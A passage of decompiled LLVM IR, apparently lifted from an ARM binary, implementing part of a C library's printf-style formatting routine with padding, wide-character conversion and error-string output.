  %v5_10694 = phi i32 [ %v0_10640, %bb155 ], [ %v0_10640, %bb150 ], [ 1, %bb156 ], [ %v2_10658, %.thread25 ], [ %v0_10640, %bb154 ]
  %v1_1065c = inttoptr i32 %v0_1065c to i8*
  %v2_1065c = load i8, i8* %v1_1065c, align 1
  %v3_1065c = zext i8 %v2_1065c to i32
  store i32 %v3_1065c, i32* %r3.global-to-local, align 4
  %v7_10660 = icmp eq i8 %v2_1065c, 48
  br i1 %v7_10660, label %dec_label_pc_10668, label %dec_label_pc_10690

dec_label_pc_10668:                               ; preds = %bb157
  store i32 %tmp102, i32* %r3.global-to-local, align 4
  %v0_1066c = load i32, i32* @r7, align 4
  %v7_10670 = icmp slt i32 %v0_1066c, 6
  br i1 %v7_10670, label %bb159, label %bb158

bb158:                                            ; preds = %dec_label_pc_10668
  store i32 11, i32* @r7, align 4
  br label %bb159

bb159:                                            ; preds = %dec_label_pc_10668, %bb158
  br i1 %v7_10584, label %.thread26, label %dec_label_pc_10684

.thread26:                                        ; preds = %bb159
  store i32 ptrtoint ([6 x i8]* @global_var_1a0a4.634 to i32), i32* @r6, align 4
  store i32 5, i32* @r5, align 4
  br label %dec_label_pc_10804

dec_label_pc_10684:                               ; preds = %bb159
  %v2_10684 = icmp eq i32 %v5_10694, 0
  br i1 %v2_10684, label %bb160, label %dec_label_pc_10690

bb160:                                            ; preds = %dec_label_pc_10684
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_10804

dec_label_pc_10690:                               ; preds = %dec_label_pc_10684, %bb157
  %v2_10690 = sub i32 %v5_10694, %v1_10624
  %tmp199 = icmp ugt i32 %v5_10694, %v1_10624
  br i1 %tmp199, label %.thread90, label %dec_label_pc_10804

.thread90:                                        ; preds = %dec_label_pc_10690
  store i32 %v2_10690, i32* @r4, align 4
  br label %dec_label_pc_10820thread-pre-split

dec_label_pc_106a0:                               ; preds = %dec_label_pc_10514
  br i1 %tmp196, label %dec_label_pc_106dc, label %dec_label_pc_106a8

dec_label_pc_106a8:                               ; preds = %dec_label_pc_106a0
  store i32 %tmp101, i32* %r3.global-to-local, align 4
  %v0_106b4 = load i32, i32* @fp, align 4
  store i32 %v0_106b4, i32* %r0.global-to-local, align 4
  %v2_106b8 = load i32, i32* %v1_104fc, align 4
  %v5_106b8 = load i32, i32* %v4_106b8, align 4
  store i32 %v5_106b8, i32* %r2.global-to-local, align 4
  store i32 %v2_106bc, i32* %r3.global-to-local, align 4
  %v6_106c0 = call i32 @_fpmaxtostr(i32 %v0_106b4, i32 %v2_106b8, i32 %v5_106b8, i32* nonnull %stack_var_-328, i32 66336)
  store i32 %v6_106c0, i32* %r0.global-to-local, align 4
  %v1_106c4 = icmp slt i32 %v6_106c0, 0
  br i1 %v1_106c4, label %dec_label_pc_10970, label %dec_label_pc_106cc

dec_label_pc_106cc:                               ; preds = %dec_label_pc_106a8
  %v2_106d0 = add i32 %v6_106c0, %stack_var_-336.2
  store i32 %v2_106d0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1095c

dec_label_pc_106dc:                               ; preds = %dec_label_pc_106a0
  br i1 %v3_106e0, label %dec_label_pc_1077c, label %dec_label_pc_106e4

dec_label_pc_106e4:                               ; preds = %dec_label_pc_106dc
  store i32 0, i32* @sl, align 4
  store i32 0, i32* %stack_var_-52, align 4
  store i32 %tmp101, i32* %r0.global-to-local, align 4
  br i1 %v7_106dc, label %dec_label_pc_106f4, label %dec_label_pc_10744

dec_label_pc_106f4:                               ; preds = %dec_label_pc_106e4
  %v2_106f4 = load i32, i32* %v1_104fc, align 4
  store i32 %v2_106f4, i32* %r3.global-to-local, align 4
  %v9_106f8 = icmp eq i32 %v2_106f4, 0
  store i32 %v2_106f4, i32* %stack_var_-44, align 4
  br i1 %v9_106f8, label %dec_label_pc_1080c, label %dec_label_pc_10704

dec_label_pc_10704:                               ; preds = %dec_label_pc_106f4
  %v3_10704 = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_10704, i32* %r3.global-to-local, align 4
  store i32 %v2_10708, i32* @r0, align 4
  %v5_10714 = icmp slt i32 %v3_10704, -1
  br i1 %v5_10714, label %bb162, label %bb161

bb161:                                            ; preds = %dec_label_pc_10704
  br label %bb162

bb162:                                            ; preds = %dec_label_pc_10704, %bb161
  %storemerge193 = phi i32 [ %v3_10704, %bb161 ], [ -1, %dec_label_pc_10704 ]
  store i32 %storemerge193, i32* @r2, align 4
  store i32 %v2_10708, i32* @r1, align 4
  store i32 %v2_1071c, i32* %r3.global-to-local, align 4
  %v0_10720 = call i32 @__GI_wcsrtombs()
  store i32 %v0_10720, i32* %r0.global-to-local, align 4
  %v7_10724 = icmp eq i32 %v0_10720, -1
  store i32 %v0_10720, i32* @r5, align 4
  br i1 %v7_10724, label %dec_label_pc_10970, label %dec_label_pc_10730

dec_label_pc_10730:                               ; preds = %bb162
  %v0_10730 = load i32, i32* @sl, align 4
  store i32 %v0_10730, i32* @r4, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  store i32 %v0_10730, i32* @r6, align 4
  br label %dec_label_pc_10820

dec_label_pc_10744:                               ; preds = %dec_label_pc_106e4
  store i32 %v2_107ec, i32* %r8.global-to-local, align 4
  %v2_10748 = load i32, i32* %v1_104fc, align 4
  store i32 %v2_1071c, i32* %r2.global-to-local, align 4
  store i32 %v2_107ec, i32* %r0.global-to-local, align 4
  %v3_10754 = call i32 @__GI_wcrtomb(i32 %v2_107ec, i32 %v2_10748, i32 %v2_1071c)
  store i32 %v3_10754, i32* %r0.global-to-local, align 4
  %v7_10758 = icmp eq i32 %v3_10754, -1
  store i32 %v3_10754, i32* @r5, align 4
  br i1 %v7_10758, label %dec_label_pc_10970, label %dec_label_pc_10764

dec_label_pc_10764:                               ; preds = %dec_label_pc_10744
  %v0_10764 = load i32, i32* @sl, align 4
  store i32 %v0_10764, i32* @r4, align 4
  store i32 %v2_107ec, i32* @r6, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  %v1_10774 = trunc i32 %v0_10764 to i8
  %v2_10774 = load i32, i32* %r8.global-to-local, align 4
  %v4_10774 = add i32 %v2_10774, %v3_10754
  %v5_10774 = inttoptr i32 %v4_10774 to i8*
  store i8 %v1_10774, i8* %v5_10774, align 1
  %v0_10824.pre.pre = load i32, i32* @r5, align 4
  %v1_10824.pre.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_10820thread-pre-split

dec_label_pc_1077c:                               ; preds = %dec_label_pc_106dc
  br i1 %v3_10780, label %dec_label_pc_107e0, label %dec_label_pc_10784

dec_label_pc_10784:                               ; preds = %dec_label_pc_1077c
  store i32 %tmp101, i32* %r0.global-to-local, align 4
  %v2_1078c = load i32, i32* %v1_104fc, align 4
  br i1 %v7_1077c, label %dec_label_pc_1078c, label %dec_label_pc_107b8

dec_label_pc_1078c:                               ; preds = %dec_label_pc_10784
  store i32 %v2_1078c, i32* @r6, align 4
  %v2_10790 = icmp eq i32 %v2_1078c, 0
  br i1 %v2_10790, label %dec_label_pc_1080c, label %dec_label_pc_10798

dec_label_pc_10798:                               ; preds = %dec_label_pc_1078c, %dec_label_pc_107e8
  %v0_107a8 = phi i32 [ %v2_1078c, %dec_label_pc_1078c ], [ %v3_107f8, %dec_label_pc_107e8 ]
  %v3_10798 = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_10798, i32* %r3.global-to-local, align 4
  %v5_107a4 = icmp slt i32 %v3_10798, -1
  br i1 %v5_107a4, label %bb164, label %bb163

bb163:                                            ; preds = %dec_label_pc_10798
  br label %bb164

bb164:                                            ; preds = %dec_label_pc_10798, %bb163
  %storemerge194 = phi i32 [ %v3_10798, %bb163 ], [ -1, %dec_label_pc_10798 ]
  store i32 %storemerge194, i32* @r1, align 4
  store i32 %v0_107a8, i32* %r0.global-to-local, align 4
  %v1_107ac = inttoptr i32 %v0_107a8 to i8*
  %v2_107ac = call i32 @strnlen(i8* %v1_107ac)
  store i32 %v2_107ac, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10814

dec_label_pc_107b8:                               ; preds = %dec_label_pc_10784
  store i32 %v2_1078c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 1, i32* @r5, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  store i32 %v2_107ec, i32* @r6, align 4
  store i32 %v2_1078c, i32* %stack_var_-180, align 4
  br label %dec_label_pc_10820thread-pre-split

dec_label_pc_107e0:                               ; preds = %dec_label_pc_1077c
  br i1 %v7_107e0, label %dec_label_pc_107e8, label %dec_label_pc_10970

dec_label_pc_107e8:                               ; preds = %dec_label_pc_107e0
  %v0_107e8 = call i32 @__errno_location()
  store i32 %v0_107e8, i32* %r0.global-to-local, align 4
  %v1_107f0 = inttoptr i32 %v0_107e8 to i32*
  %v2_107f0 = load i32, i32* %v1_107f0, align 4
  store i32 %v2_107f0, i32* @r0, align 4
  store i32 128, i32* @r2, align 4
  %v3_107f8 = call i32 @__GI___glibc_strerror_r(i32 %v2_107f0, i32 %v2_107ec, i32 128)
  store i32 %v3_107f8, i32* %r0.global-to-local, align 4
  store i32 %v3_107f8, i32* @r6, align 4
  br label %dec_label_pc_10798

dec_label_pc_10804:                               ; preds = %dec_label_pc_10690, %.thread26, %bb160
  %v0_10824.pre81 = phi i32 [ 0, %bb160 ], [ 5, %.thread26 ], [ %v1_10624, %dec_label_pc_10690 ]
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_10820thread-pre-split

dec_label_pc_1080c:                               ; preds = %dec_label_pc_1078c, %dec_label_pc_106f4
  store i32 ptrtoint ([7 x i8]* @global_var_1a0ac.637 to i32), i32* @r6, align 4
  br label %dec_label_pc_10814

dec_label_pc_10814:                               ; preds = %bb164, %dec_label_pc_1080c
  %storemerge = phi i32 [ 6, %dec_label_pc_1080c ], [ %v2_107ac, %bb164 ]
  store i32 %storemerge, i32* @r5, align 4
  store i32 0, i32* @r4, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  br label %dec_label_pc_10820

dec_label_pc_10820thread-pre-split:               ; preds = %.thread90, %dec_label_pc_10764, %dec_label_pc_107b8, %dec_label_pc_10804
  %v1_10824.pre = phi i32 [ 0, %dec_label_pc_10804 ], [ %v1_10824.pre.pre, %dec_label_pc_10764 ], [ 0, %dec_label_pc_107b8 ], [ %v2_10690, %.thread90 ]
  %v0_10824.pre = phi i32 [ %v0_10824.pre81, %dec_label_pc_10804 ], [ %v0_10824.pre.pre, %dec_label_pc_10764 ], [ 1, %dec_label_pc_107b8 ], [ %v1_10624, %.thread90 ]
  %stack_var_-316.2.ph = phi i32 [ %v0_10618, %dec_label_pc_10804 ], [ %v0_10544, %dec_label_pc_10764 ], [ %v0_10544, %dec_label_pc_107b8 ], [ %v0_10618, %.thread90 ]
  %v0_10820.pr = load i32, i32* @r7, align 4
  br label %dec_label_pc_10820

dec_label_pc_10820:                               ; preds = %dec_label_pc_10820thread-pre-split, %dec_label_pc_10730, %dec_label_pc_10814
  %v1_10860 = phi i32 [ %v1_10824.pre, %dec_label_pc_10820thread-pre-split ], [ %v0_10730, %dec_label_pc_10730 ], [ 0, %dec_label_pc_10814 ]
  %v0_10824 = phi i32 [ %v0_10824.pre, %dec_label_pc_10820thread-pre-split ], [ %v0_10720, %dec_label_pc_10730 ], [ %storemerge, %dec_label_pc_10814 ]
  %v0_1082c = phi i32 [ %v0_10820.pr, %dec_label_pc_10820thread-pre-split ], [ 11, %dec_label_pc_10730 ], [ 11, %dec_label_pc_10814 ]
  %v0_10868 = phi i32 [ %stack_var_-316.2.ph, %dec_label_pc_10820thread-pre-split ], [ %v0_10544, %dec_label_pc_10730 ], [ %v0_10544, %dec_label_pc_10814 ]
  %v7_10820 = icmp eq i32 %v0_1082c, 11
  %v2_10824 = add i32 %v0_10824, %v1_10860
  br i1 %v7_10820, label %dec_label_pc_1083c, label %bb165

bb165:                                            ; preds = %dec_label_pc_10820
  %v7_10834 = icmp sgt i32 %v0_1082c, 5
  %. = select i1 %v7_10834, i32 2, i32 1
  store i32 %., i32* %r3.global-to-local, align 4
  %v2_10838 = add i32 %., %v2_10824
  br label %dec_label_pc_1083c

dec_label_pc_1083c:                               ; preds = %dec_label_pc_10820, %bb165
  %v0_10850 = phi i32 [ %v2_10824, %dec_label_pc_10820 ], [ %v2_10838, %bb165 ]
  store i32 %tmp97, i32* %r2.global-to-local, align 4
  %v2_10840 = sub i32 %tmp97, %v0_10850
  %v3_10840 = icmp uge i32 %tmp97, %v0_10850
  %v9_10840 = icmp eq i32 %tmp97, %v0_10850
  %v2_10844 = xor i1 %v3_10840, true
  %v3_10844 = or i1 %v9_10840, %v2_10844
  br i1 %v3_10844, label %bb166, label %bb167

bb166:                                            ; preds = %dec_label_pc_1083c
  store i32 0, i32* @sl, align 4
  br label %bb167

bb167:                                            ; preds = %dec_label_pc_1083c, %bb166
  %v2_10848 = xor i1 %v9_10840, true
  %v3_10848 = and i1 %v3_10840, %v2_10848
  br i1 %v3_10848, label %bb168, label %._crit_edge

._crit_edge:                                      ; preds = %bb167
  %v1_10850.pre = load i32, i32* @sl, align 4
  br label %bb169

bb168:                                            ; preds = %bb167
  store i32 %v2_10840, i32* @sl, align 4
  br label %bb169

bb169:                                            ; preds = %._crit_edge, %bb168
  %v2_10860 = phi i32 [ %v1_10850.pre, %._crit_edge ], [ %v2_10840, %bb168 ]
  %v2_10850 = add i32 %v0_10850, %stack_var_-336.2
  %v2_10854 = add i32 %v2_10850, %v2_10860
  store i32 %v2_10854, i32* @ip, align 4
  store i32 %v0_10868, i32* %r3.global-to-local, align 4
  %v0_1085c = load i32, i32* @sb, align 4
  %v7_1085c = icmp eq i32 %v0_1085c, 48
  br i1 %v7_1085c, label %bb170, label %.thread29

bb170:                                            ; preds = %bb169
  %v3_10860 = add i32 %v2_10860, %v1_10860
  store i32 %v3_10860, i32* @r4, align 4
  store i32 0, i32* @sl, align 4
  br label %.thread29

.thread29:                                        ; preds = %bb169, %bb170
  %v0_1087c = phi i32 [ %v2_10860, %bb169 ], [ 0, %bb170 ]
  %v1_10868 = and i32 %v0_10868, 8
  store i32 %v1_10868, i32* @r8, align 4
  %v2_10868 = icmp eq i32 %v1_10868, 0
  br i1 %v2_10868, label %dec_label_pc_10874, label %dec_label_pc_10890

dec_label_pc_10874:                               ; preds = %.thread29
  %v0_10874 = load i32, i32* @fp, align 4
  store i32 %v0_10874, i32* %r0.global-to-local, align 4
  store i32 %v0_1087c, i32* %r2.global-to-local, align 4
  %v4_10880 = call i32 @_charpad(i32 %v0_10874, i8 32, i32 %v0_1087c)
  store i32 %v4_10880, i32* %r0.global-to-local, align 4
  %v1_10884 = load i32, i32* @sl, align 4
  %v9_10884 = icmp eq i32 %v4_10880, %v1_10884
  br i1 %v9_10884, label %dec_label_pc_1088c, label %dec_label_pc_10970

dec_label_pc_1088c:                               ; preds = %dec_label_pc_10874
  %v0_1088c = load i32, i32* @r8, align 4
  store i32 %v0_1088c, i32* @sl, align 4
  %v0_10898.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_10890

dec_label_pc_10890:                               ; preds = %.thread29, %dec_label_pc_1088c
  %v0_10898 = phi i32 [ %v0_1082c, %.thread29 ], [ %v0_10898.pre, %dec_label_pc_1088c ]
  %v0_10894 = load i32, i32* @fp, align 4
  %v2_10898 = add i32 %v0_10898, ptrtoint (i32* @global_var_1a0b4.639 to i32)
  store i32 %v2_10898, i32* %r0.global-to-local, align 4
  %v2_1089c = inttoptr i32 %v2_10898 to i8*
  %v3_1089c = call i32 @__GI_fputs_unlocked(i8* %v2_1089c, i32 %v0_10894)
  %v0_108a0 = load i32, i32* @fp, align 4
  store i32 %v0_108a0, i32* %r0.global-to-local, align 4
  %v0_108a8 = load i32, i32* @r4, align 4
  store i32 %v0_108a8, i32* %r2.global-to-local, align 4
  %v4_108ac = call i32 @_charpad(i32 %v0_108a0, i8 48, i32 %v0_108a8)
  store i32 %v4_108ac, i32* %r0.global-to-local, align 4
  %v1_108b0 = load i32, i32* @r4, align 4
  %v9_108b0 = icmp eq i32 %v4_108ac, %v1_108b0
  br i1 %v9_108b0, label %dec_label_pc_108b8, label %dec_label_pc_10970

dec_label_pc_108b8:                               ; preds = %dec_label_pc_10890
  %v3_108b8 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_108b8, i32* %r3.global-to-local, align 4
  %v2_108bc = icmp eq i32 %v3_108b8, 0
  br i1 %v2_108bc, label %dec_label_pc_108cc, label %dec_label_pc_1092cthread-pre-split

dec_label_pc_108cc:                               ; preds = %dec_label_pc_108b8
  %v0_108cc = load i32, i32* @r5, align 4
  %v2_108cc = icmp eq i32 %v0_108cc, 0
  br i1 %v2_108cc, label %bb171, label %bb172

bb171:                                            ; preds = %dec_label_pc_108cc
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread36

bb172:                                            ; preds = %dec_label_pc_108cc
  %v1_108d4 = load i32, i32* @r6, align 4
  store i32 %v1_108d4, i32* %r0.global-to-local, align 4
  %v1_108dc = load i32, i32* @fp, align 4
  store i32 %v1_108dc, i32* %r2.global-to-local, align 4
  br label %.thread36

.thread36:                                        ; preds = %bb171, %bb172
  store i32 67812, i32* @lr, align 4
  %v1_108e0 = xor i1 %v2_108cc, true
  call void @__pseudo_cond_branch(i1 %v1_108e0, i32 ptrtoint (i32* @global_var_13f74.630 to i32))
  %v0_108e4 = load i32, i32* %r0.global-to-local, align 4
  %v1_108e4 = load i32, i32* @r5, align 4
  %v9_108e4 = icmp eq i32 %v0_108e4, %v1_108e4
  br i1 %v9_108e4, label %dec_label_pc_10944, label %dec_label_pc_10970

dec_label_pc_108f0:                               ; preds = %dec_label_pc_1092c
  %v2_108f0 = icmp ult i32 %v1_108f4, 128
  %.v1_108f4 = select i1 %v2_108f0, i32 %v1_108f4, i32 128
  store i32 %.v1_108f4, i32* @r2, align 4
  %v0_108fc = call i32 @__GI_wcsrtombs()
  store i32 %v0_108fc, i32* @r4, align 4
  %v2_10900 = icmp eq i32 %v0_108fc, 0
  store i32 %v0_108fc, i32* %r3.global-to-local, align 4
  store i32 %v2_107ec, i32* %r0.global-to-local, align 4
  %v0_10910 = load i32, i32* @fp, align 4
  store i32 %v0_10910, i32* %r2.global-to-local, align 4
  br i1 %v2_10900, label %dec_label_pc_10920, label %dec_label_pc_10918

dec_label_pc_10918:                               ; preds = %dec_label_pc_108f0
  %v3_10918 = call i32 @__stdio_fwrite(i32 %v2_107ec, i32 %v0_108fc, i32 %v0_10910)
  store i32 %v3_10918, i32* %r0.global-to-local, align 4
  store i32 %v3_10918, i32* %r3.global-to-local, align 4
  %v1_10920.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_10920

dec_label_pc_10920:                               ; preds = %dec_label_pc_108f0, %dec_label_pc_10918
  %v1_10920 = phi i32 [ 0, %dec_label_pc_108f0 ], [ %v1_10920.pre, %dec_label_pc_10918 ]
  %v0_10924 = phi i32 [ 0, %dec_label_pc_108f0 ], [ %v3_10918, %dec_label_pc_10918 ]
  %v9_10920 = icmp eq i32 %v0_10924, %v1_10920
  %v1_10924 = load i32, i32* @r5, align 4
  %v2_10924 = sub i32 %v1_10924, %v0_10924
  store i32 %v2_10924, i32* @r5, align 4
  br i1 %v9_10920, label %dec_label_pc_1092c, label %dec_label_pc_10970

dec_label_pc_1092cthread-pre-split:               ; preds = %dec_label_pc_108b8
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v0_10930.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_1092c

dec_label_pc_1092c:                               ; preds = %dec_label_pc_1092cthread-pre-split, %dec_label_pc_10920
  %v1_108f4 = phi i32 [ %v0_10930.pr, %dec_label_pc_1092cthread-pre-split ], [ %v2_10924, %dec_label_pc_10920 ]
  store i32 %v2_107ec, i32* @r6, align 4
  %v2_10930 = icmp eq i32 %v1_108f4, 0
  store i32 %v2_10708, i32* @r1, align 4
  store i32 %v2_1071c, i32* %r3.global-to-local, align 4
  store i32 %v2_107ec, i32* @r0, align 4
  br i1 %v2_10930, label %dec_label_pc_10944, label %dec_label_pc_108f0

dec_label_pc_10944:                               ; preds = %dec_label_pc_1092c, %.thread36
  %v0_10944 = load i32, i32* @fp, align 4
  store i32 %v0_10944, i32* %r0.global-to-local, align 4
  %v0_1094c = load i32, i32* @sl, align 4
  store i32 %v0_1094c, i32* %r2.global-to-local, align 4
  %v4_10950 = call i32 @_charpad(i32 %v0_10944, i8 32, i32 %v0_1094c)
  store i32 %v4_10950, i32* %r0.global-to-local, align 4
  %v1_10954 = load i32, i32* @sl, align 4
  %v9_10954 = icmp eq i32 %v4_10950, %v1_10954
  br i1 %v9_10954, label %dec_label_pc_1095c, label %dec_label_pc_10970

dec_label_pc_1095c:                               ; preds = %dec_label_pc_10944, %dec_label_pc_106cc, %dec_label_pc_104f0
  %stack_var_-316.3 = phi i32 [ %v0_10544, %dec_label_pc_104f0 ], [ %v0_10868, %dec_label_pc_10944 ], [ %v0_10544, %dec_label_pc_106cc ]
  %stack_var_-336.3 = phi i32 [ %stack_var_-336.2, %dec_label_pc_104f0 ], [ %v2_10854, %dec_label_pc_10944 ], [ %v2_106d0, %dec_label_pc_106cc ]
  %v3_1095c = load i32, i32* %stack_var_-332, align 4
  store i32 %v3_1095c, i32* @r4, align 4
  br label %dec_label_pc_10960

dec_label_pc_10960:                               ; preds = %dec_label_pc_10400, %dec_label_pc_1095c
  %v0_10960 = phi i32 [ %v0_10960.pre, %dec_label_pc_10400 ], [ %v3_1095c, %dec_label_pc_1095c ]
  %v0_10544 = phi i32 [ %tmp100, %dec_label_pc_10400 ], [ %stack_var_-316.3, %dec_label_pc_1095c ]
  %stack_var_-336.4 = phi i32 [ 0, %dec_label_pc_10400 ], [ %stack_var_-336.3, %dec_label_pc_1095c ]
  store i32 %v0_10960, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10418.outer

dec_label_pc_10418.outer:                         ; preds = %dec_label_pc_10968, %dec_label_pc_10960
  %v5_10444 = phi i32 [ %v1_10474, %dec_label_pc_10968 ], [ %v0_10960, %dec_label_pc_10960 ]
  %v0_1041849 = phi i32 [ %v1_10968, %dec_label_pc_10968 ], [ %v0_10960, %dec_label_pc_10960 ]
  %stack_var_-336.1.ph = phi i32 [ %stack_var_-336.2, %dec_label_pc_10968 ], [ %stack_var_-336.4, %dec_label_pc_10960 ]
  %v1_10418180 = inttoptr i32 %v0_1041849 to i8*
  %v2_10418181 = load i8, i8* %v1_10418180, align 1
  %v3_10418182 = zext i8 %v2_10418181 to i32
  store i32 %v3_10418182, i32* %r3.global-to-local, align 4
  %v2_1041c183 = icmp eq i8 %v2_10418181, 0
  br i1 %v2_1041c183, label %dec_label_pc_10434, label %bb126

dec_label_pc_10968:                               ; preds = %dec_label_pc_10474
  %v1_10968 = add i32 %v0_1047c, 2
  store i32 %v1_10968, i32* @r4, align 4
  br label %dec_label_pc_10418.outer

dec_label_pc_10970:                               ; preds = %dec_label_pc_107e0, %dec_label_pc_10944, %.thread36, %dec_label_pc_10890, %dec_label_pc_10874, %dec_label_pc_10744, %bb162, %dec_label_pc_106a8, %bb130, %dec_label_pc_10920
  br label %dec_label_pc_10978

dec_label_pc_10978:                               ; preds = %dec_label_pc_10468, %bb, %dec_label_pc_103e8, %dec_label_pc_10970
  %stack_var_-336.5 = phi i32 [ -1, %bb ], [ -1, %dec_label_pc_103e8 ], [ -1, %dec_label_pc_10970 ], [ %stack_var_-336.2, %dec_label_pc_10468 ]
  store i32 %stack_var_-336.5, i32* %r0.global-to-local, align 4
  store i32 %v6_103a4, i32* @r5, align 4
  store i32 %v15_103a4, i32* %r8.global-to-local, align 4
  store i32 %v18_103a4, i32* @sb, align 4
  store i32 %v21_103a4, i32* @sl, align 4
  store i32 %v24_103a4, i32* @fp, align 4
  ret i32 %stack_var_-336.5

; uselistorder directives
  uselistorder i32 %stack_var_-336.5, { 1, 0 }
  uselistorder i32 %v1_10968, { 1, 0 }
  uselistorder i8 %v2_10418181, { 1, 2, 0 }
  uselistorder i32 %v0_1041849, { 2, 0, 1 }
  uselistorder i32 %v5_10444, { 2, 3, 1, 0 }
  uselistorder i32 %v0_10544, { 9, 12, 13, 2, 10, 8, 11, 6, 5, 4, 1, 0, 7, 3, 15, 14 }
  uselistorder i32 %v0_10960, { 1, 0, 2 }
  uselistorder i32 %v1_108f4, { 2, 1, 0 }
  uselistorder i32 %v0_108fc, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1087c, { 1, 0 }
  uselistorder i32 %v2_10860, { 2, 0, 1 }
  uselistorder i1 %v3_10840, { 1, 0 }
  uselistorder i32 %v0_10850, { 0, 2, 3, 1 }
  uselistorder i32 %v2_10824, { 1, 0 }
  uselistorder i32 %v0_10868, { 1, 0, 2 }
  uselistorder i32 %v3_107f8, { 1, 2, 0 }
  uselistorder i32 %v0_107a8, { 1, 0 }
  uselistorder i32 %v2_1078c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_10754, { 1, 2, 0, 3 }
  uselistorder i32 %v0_10720, { 1, 2, 0, 3 }
  uselistorder i32 %v1_10624, { 3, 2, 0, 4, 1, 5 }
  uselistorder i32 %v0_10640, { 1, 2, 3, 0 }
  uselistorder i32 %v6_105c0, { 2, 1, 0, 3, 4, 7, 5, 6 }
  uselistorder i32 %v4_10524, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v0_104d4.pre, { 2, 1, 0 }
  uselistorder i32 %v1_104cc, { 1, 0 }
  uselistorder i32 %v1_10474, { 2, 0, 1, 3 }
  uselistorder i32 %stack_var_-336.2, { 0, 8, 6, 1, 2, 5, 4, 3, 7 }
  uselistorder i32 %v2_10434, { 1, 0 }
  uselistorder i32 %v1_1042c.lcssa, { 1, 0 }
  uselistorder i8 %v2_10418, { 1, 2, 0 }
  uselistorder i32 %v2_1042c, { 1, 2, 3, 0 }
  uselistorder i1 %v7_10638, { 1, 0 }
  uselistorder i1 %v7_10584, { 1, 2, 0 }
  uselistorder i1 %v7_1077c, { 1, 0 }
  uselistorder i1 %v7_106dc, { 1, 0 }
  uselistorder i1 %v7_105c8, { 1, 0 }
  uselistorder i32 %v2_1071c, { 0, 2, 1, 3 }
  uselistorder i32 %v2_107ec, { 3, 2, 5, 4, 11, 10, 9, 7, 8, 6, 1, 0 }
  uselistorder i32* %v1_104fc, { 3, 0, 2, 1, 4 }
  uselistorder i32 %v2_104d0, { 2, 4, 3, 5, 0, 1 }
  uselistorder i32 %v2_104b0, { 1, 2, 0 }
  uselistorder i32 %v4_104a8, { 1, 0 }
  uselistorder i32 %v2_103ac, { 0, 1, 2, 4, 3, 5, 6 }
  uselistorder i32* %stack_var_-36, { 1, 0 }
  uselistorder i32* %stack_var_-332, { 2, 1, 3, 4, 0, 5 }
  uselistorder i32* %stack_var_-328, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 %tmp103, { 2, 1, 0 }
  uselistorder i32 %tmp102, { 19, 18, 15, 13, 8, 9, 0, 10, 12, 11, 3, 4, 5, 6, 7, 1, 2, 17, 16, 14 }
  uselistorder i32 %tmp101, { 6, 5, 3, 2, 0, 4, 1 }
  uselistorder i32 %tmp97, { 2, 1, 3, 0 }
  uselistorder i32* %r3.global-to-local, { 38, 3, 4, 1, 2, 5, 6, 0, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 39, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37 }
  uselistorder i32* %r2.global-to-local, { 22, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 25, 26, 20, 21, 23, 24, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 2, 5, 4, 7, 6, 9, 8, 10, 11, 13, 12, 15, 14, 16, 17, 20, 18, 19, 22, 21, 24, 23, 26, 25, 28, 27, 32, 29, 30, 31, 1, 33, 34, 44, 35, 45, 3, 37, 36, 39, 38, 41, 40, 43, 42, 0 }
  uselistorder i32 (i32, i8, i32)* @_charpad, { 1, 2, 3, 0 }
  uselistorder i32 ()* @__GI_wcsrtombs, { 1, 0 }
  uselistorder label %dec_label_pc_10978, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_10970, { 1, 9, 2, 3, 4, 0, 5, 6, 7, 8 }
  uselistorder label %dec_label_pc_10960, { 1, 0 }
  uselistorder label %dec_label_pc_10920, { 1, 0 }
  uselistorder label %.thread36, { 1, 0 }
  uselistorder label %dec_label_pc_10890, { 1, 0 }
  uselistorder label %.thread29, { 1, 0 }
  uselistorder label %bb169, { 1, 0 }
  uselistorder label %bb167, { 1, 0 }
  uselistorder label %dec_label_pc_1083c, { 1, 0 }
  uselistorder label %dec_label_pc_10820, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10820thread-pre-split, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10814, { 1, 0 }
  uselistorder label %dec_label_pc_10804, { 0, 2, 1 }
  uselistorder label %bb164, { 1, 0 }
  uselistorder label %dec_label_pc_10798, { 1, 0 }
  uselistorder label %bb162, { 1, 0 }
  uselistorder label %bb159, { 1, 0 }
  uselistorder label %bb157, { 4, 1, 2, 0, 3 }
  uselistorder label %bb154, { 1, 0 }
  uselistorder label %bb152, { 1, 0 }
  uselistorder label %bb150, { 1, 0 }
  uselistorder label %bb148, { 4, 3, 1, 0, 2 }
  uselistorder label %bb145, { 1, 0 }
  uselistorder label %dec_label_pc_10574, { 1, 0 }
  uselistorder label %dec_label_pc_10570, { 2, 1, 0 }
